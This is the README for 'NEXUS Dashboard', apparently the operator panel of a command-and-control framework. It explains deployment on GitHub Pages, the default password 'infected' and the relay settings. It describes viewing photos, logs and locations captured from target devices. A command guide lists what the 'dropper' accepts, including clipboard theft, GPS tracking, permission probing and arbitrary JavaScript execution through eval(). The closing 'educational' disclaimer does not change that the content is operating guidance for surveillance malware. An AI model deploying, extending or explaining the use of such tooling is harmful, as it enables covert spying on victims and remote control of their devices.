# NEXUS Dashboard – Admin Panel (GitHub Pages)

NEXUS Dashboard is a visual interface for the NEXUS C2 framework. It provides operators with a centralized, single-page application to monitor connected devices, view captured data (such as photos, logs, and locations), and send commands to target systems.

## Deployment

Deploying the dashboard to GitHub Pages is a straightforward process:

1. Fork or clone the repository to your local workspace.
2. Ensure `nexus.html` and `config.json` are placed in the root of the `gh-pages` branch (or the `main` branch if you are serving GitHub Pages from the root).
3. Update the `config.json` file with your active backend API and WebSocket relay URLs. Example:
   ```json
   {
     "backendUrl": "https://your-backend-api.vercel.app",
     "relayUrl": "wss://your-relay-service.onrender.com"
   }
   ```
4. Navigate to your repository's **Settings** > **Pages** and enable GitHub Pages for the selected branch.
5. Access the dashboard via the URL provided by GitHub.

## Authentication

The dashboard is gated behind a basic login screen. The default password is `infected`. 

To change the password, open `nexus.html` in your text editor, locate the `login()` JavaScript function, and update the string comparison value to your desired password.

## Configuration

The dashboard determines which backend and relay to connect to based on a strict loading order:

1. **`config.json` (Static File)** – Holds the highest priority. If fetched successfully, these values are used.
2. **`localStorage`** – If the config file is unavailable or if a user modifies settings via the UI, values stored in the browser's `localStorage` are used.
3. **Hardcoded Defaults** – Fallback values pointing to example infrastructure URLs if the above methods fail.

Operators can apply temporary overrides to the API and Relay URLs directly through the dashboard's Settings modal. These overrides are saved to `localStorage`.

## Features

* Login screen for basic access control.
* Device grouping by IP address for better fleet management.
* Real-time online/offline status indicators.
* Photo gallery with thumbnails and full-size viewing.
* Log display categorized by severity levels.
* Location markers plotted on an interactive map (Leaflet).
* Direct command sending via the WebSocket relay.
* Command history modal for auditing executed tasks.
* Per-device notes for operator tracking.
* CSV export functionality for backing up grouped device data.
* Auto-refresh toggle (updates interface at a 5-second interval).
* Settings modal for quick backend/relay URL overrides.

## Testing

To verify the dashboard is fully operational and communicating with your infrastructure:

* Check the backend health by visiting the `/api/test` endpoint (a quick link is provided in the dashboard header).
* Use the WebSocket tester provided on the relay server's root page to confirm real-time connectivity.
* Select an active device in the dashboard and send a test command to ensure the relay and device are successfully communicating.

## Dependencies

The dashboard is built with vanilla HTML, CSS, and JavaScript. The only external dependency is Leaflet, used for interactive map rendering, which is loaded securely via CDN. There are no npm packages or build steps required.

## 📖 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝙶𝚞𝚒𝚍𝚎 – 𝙽𝙴𝚇𝚄𝚂 𝙳𝚛𝚘𝚙𝚙𝚎𝚛
𝙱𝚎𝚕𝚘𝚠 𝚒𝚜 𝚝𝚑𝚎 𝚌𝚘𝚖𝚙𝚕𝚎𝚝𝚎 𝚕𝚒𝚜𝚝 𝚘𝚏 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜 𝚝𝚑𝚎 𝚍𝚛𝚘𝚙𝚙𝚎𝚛 𝚛𝚎𝚌𝚘𝚐𝚗𝚒𝚣𝚎𝚜, 𝚠𝚑𝚊𝚝 𝚝𝚑𝚎𝚢 𝚍𝚘, 𝚊𝚗𝚍 𝚑𝚘𝚠 𝚝𝚘 𝚞𝚜𝚎 𝚝𝚑𝚎𝚖. 𝚃𝚑𝚎𝚜𝚎 𝚌𝚊𝚗 𝚋𝚎 𝚜𝚎𝚗𝚝 𝚏𝚛𝚘𝚖 𝚢𝚘𝚞𝚛 𝚍𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍 𝚟𝚒𝚊 𝚝𝚑𝚎 𝚛𝚎𝚕𝚊𝚢.

𝙲𝚘𝚖𝚖𝚊𝚗𝚍	𝙳𝚎𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗	𝙾𝚞𝚝𝚙𝚞𝚝 𝙴𝚡𝚊𝚖𝚙𝚕𝚎
whoami	𝚁𝚎𝚝𝚞𝚛𝚗𝚜 𝚍𝚎𝚟𝚒𝚌𝚎 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 𝚊𝚜 𝙹𝚂𝙾𝙽 (𝙸𝙳, 𝚙𝚕𝚊𝚝𝚏𝚘𝚛𝚖, 𝚄𝙰, 𝚜𝚌𝚛𝚎𝚎𝚗, 𝚎𝚝𝚌.)	{ "deviceId":"dev_...", "platform":"Win32", "screen":"1920x1080", ... }
deviceinfo	𝚂𝚊𝚖𝚎 𝚊𝚜 𝚠𝚑𝚘𝚊𝚖𝚒 𝚋𝚞𝚝 𝚖𝚘𝚛𝚎 𝚍𝚎𝚝𝚊𝚒𝚕𝚎𝚍 (𝚌𝚘𝚕𝚘𝚛𝙳𝚎𝚙𝚝𝚑, 𝚝𝚘𝚞𝚌𝚑 𝚜𝚞𝚙𝚙𝚘𝚛𝚝, 𝚟𝚎𝚗𝚍𝚘𝚛)	𝚂𝚒𝚖𝚒𝚕𝚊𝚛 𝙹𝚂𝙾𝙽 𝚠𝚒𝚝𝚑 𝚎𝚡𝚝𝚛𝚊 𝚏𝚒𝚎𝚕𝚍𝚜
screenshot	𝙰𝚝𝚝𝚎𝚖𝚙𝚝𝚜 𝚝𝚘 𝚌𝚊𝚙𝚝𝚞𝚛𝚎 𝚊 𝚜𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 (𝚋𝚛𝚘𝚠𝚜𝚎𝚛 𝚕𝚒𝚖𝚒𝚝𝚊𝚝𝚒𝚘𝚗 – 𝚞𝚜𝚞𝚊𝚕𝚕𝚢 𝚛𝚎𝚝𝚞𝚛𝚗𝚜 𝚊 𝚙𝚕𝚊𝚌𝚎𝚑𝚘𝚕𝚍𝚎𝚛)	"Screenshot capture is not available in browser – use the APK for this."
clipboard	𝚁𝚎𝚊𝚍𝚜 𝚝𝚑𝚎 𝚌𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 𝚝𝚎𝚡𝚝 (𝚛𝚎𝚚𝚞𝚒𝚛𝚎𝚜 𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗)	𝚃𝚎𝚡𝚝 𝚏𝚛𝚘𝚖 𝚌𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 𝚘𝚛 𝚊𝚗 𝚎𝚛𝚛𝚘𝚛 𝚖𝚎𝚜𝚜𝚊𝚐𝚎
battery	𝚁𝚎𝚝𝚞𝚛𝚗𝚜 𝚋𝚊𝚝𝚝𝚎𝚛𝚢 𝚒𝚗𝚏𝚘 (𝚕𝚎𝚟𝚎𝚕%, 𝚌𝚑𝚊𝚛𝚐𝚒𝚗𝚐, 𝚝𝚒𝚖𝚎𝚜)	{ "level":85, "charging":true, "chargingTime":3600, "dischargingTime":null }
location	𝚁𝚎𝚝𝚞𝚛𝚗𝚜 𝚝𝚑𝚎 𝚌𝚞𝚛𝚛𝚎𝚗𝚝 𝙶𝙿𝚂 𝚌𝚘𝚘𝚛𝚍𝚒𝚗𝚊𝚝𝚎𝚜 (𝚕𝚊𝚝/𝚕𝚘𝚗)	{ "lat":40.7128, "lon":-74.0060 }
geolocation	𝙰𝚕𝚒𝚊𝚜 𝚏𝚘𝚛 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗 (𝚛𝚎𝚝𝚞𝚛𝚗𝚜 𝚜𝚊𝚖𝚎)	𝚂𝚊𝚖𝚎 𝚊𝚜 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗
listpermissions	𝙲𝚑𝚎𝚌𝚔𝚜 𝚝𝚑𝚎 𝚜𝚝𝚊𝚝𝚎 𝚘𝚏 𝚌𝚊𝚖𝚎𝚛𝚊, 𝚖𝚒𝚌, 𝚐𝚎𝚘𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗, 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗𝚜 𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗𝚜	{ "camera":"granted", "microphone":"prompt", "geolocation":"granted", ... }
ping	𝚁𝚎𝚝𝚞𝚛𝚗𝚜 𝚙𝚘𝚗𝚐 – 𝚞𝚜𝚎𝚏𝚞𝚕 𝚏𝚘𝚛 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚟𝚒𝚝𝚢 𝚝𝚎𝚜𝚝𝚒𝚗𝚐	"pong"
echo	𝙴𝚌𝚑𝚘𝚎𝚜 𝚝𝚑𝚎 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚋𝚊𝚌𝚔 (𝚗𝚘 𝚙𝚊𝚛𝚊𝚖𝚎𝚝𝚎𝚛 𝚜𝚞𝚙𝚙𝚘𝚛𝚝)	"echo"
help	𝙳𝚒𝚜𝚙𝚕𝚊𝚢𝚜 𝚝𝚑𝚒𝚜 𝚕𝚒𝚜𝚝 𝚘𝚏 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜	𝙻𝚒𝚜𝚝 𝚘𝚏 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜 𝚠𝚒𝚝𝚑 𝚊 𝚋𝚛𝚒𝚎𝚏 𝚍𝚎𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗
𝙰𝚍𝚟𝚊𝚗𝚌𝚎𝚍: 𝙰𝚗𝚢 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚗𝚘𝚝 𝚒𝚗 𝚝𝚑𝚎 𝚕𝚒𝚜𝚝 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚙𝚊𝚜𝚜𝚎𝚍 𝚝𝚘 𝚎𝚟𝚊𝚕() 𝚊𝚗𝚍 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚊𝚜 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝. 𝚃𝚑𝚒𝚜 𝚊𝚕𝚕𝚘𝚠𝚜 𝚏𝚘𝚛 𝚖𝚊𝚡𝚒𝚖𝚞𝚖 𝚏𝚕𝚎𝚡𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚋𝚞𝚝 𝚜𝚑𝚘𝚞𝚕𝚍 𝚋𝚎 𝚞𝚜𝚎𝚍 𝚠𝚒𝚝𝚑 𝚌𝚊𝚞𝚝𝚒𝚘𝚗 (𝚘𝚗𝚕𝚢 𝚒𝚗 𝚌𝚘𝚗𝚝𝚛𝚘𝚕𝚕𝚎𝚍 𝚎𝚗𝚟𝚒𝚛𝚘𝚗𝚖𝚎𝚗𝚝𝚜).

## Project Structure

```text
.
├── nexus.html       # Main dashboard file
├── config.json      # Configuration file (backend and relay URLs)
└── README.md        # This file
```

## Security Notes

* **Client-Side Password:** The login mechanism is currently enforced entirely client-side. This is intended for demonstration and educational purposes only.
* **Production Deployment:** For real-world production use, you must implement proper server-side authentication and session validation.
* **CORS:** Cross-Origin Resource Sharing (CORS) is managed by the backend API. The GitHub Pages dashboard does not require any specialized CORS configuration.

## License

For educational and authorized testing purposes only. Use responsibly.
